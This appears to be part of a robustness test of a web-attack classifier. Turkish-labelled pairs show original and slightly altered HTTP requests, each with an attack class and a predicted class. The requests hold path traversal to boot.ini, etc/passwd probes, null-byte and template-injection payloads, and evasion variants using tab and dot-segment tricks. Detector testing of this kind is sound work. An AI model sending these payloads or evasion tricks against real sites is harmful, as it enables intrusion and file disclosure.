  - önce: `-profile/post.php/?action=etc%2Fpasswd&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=awedChamois0&password=Ufr0Ts&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%`
  - sonra: `-profile/post.php/?action=etc%2Fpasswd&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=awedChamois0&password=Ufr0Ts&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-acco`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `post.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=foreve`
  - sonra: `post.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2509data.id%2509%257D%257D&login=Login&redirect=&rememberme=foreve`
- **Path Traversal** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `GET /cwhp/auditLog.do?file=..\..\..\..\..\..\..\boot.ini HTTP/1.1 Host: 249.network5-175-62-1`
  - sonra: `GET /cwhp/auditLog.do?file=.\..\.\..\.\..\.\..\.\..\.\..\.\..\boot.ini HTTP/1.1 Host: 249.network5-175-62-1`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `GET /cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\lib\classpath\com\cisc`
  - sonra: `GET /cwhp/auditLog.do?file=.\..\.\..\.\..\.\..\.\..\.\..\.\..\Program%20Files\CSCOpx\lib\classpath\com\cisc`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `ount/edit-profile/post.php/?action=%00&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `ount/edit-profile/post.php/?action=%00&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `ount/edit-profile/post.php/?action=%00&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=customer;`
  - sonra: `ount/edit-profile/post.php/?action=%00&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=custo`
- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `log/etc%252Fpasswd/my-account/edit-profile/%7B%7B%20data.editLink%20%7D%7D&image-editor HTTP/1.1 Host: test-site.com U`
  - sonra: `log/etc%252Fpasswd/my-account/edit-profile/%7B%7B%09data.editLink%09%7D%7D&image-editor HTTP/1.1 Host: test-site.com U`
- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `252Fetc%252Fpasswd/my-account/edit-profile/%7B%7B%20data.link%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `252Fetc%252Fpasswd/my-account/edit-profile/%7B%7B%09data.link%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`

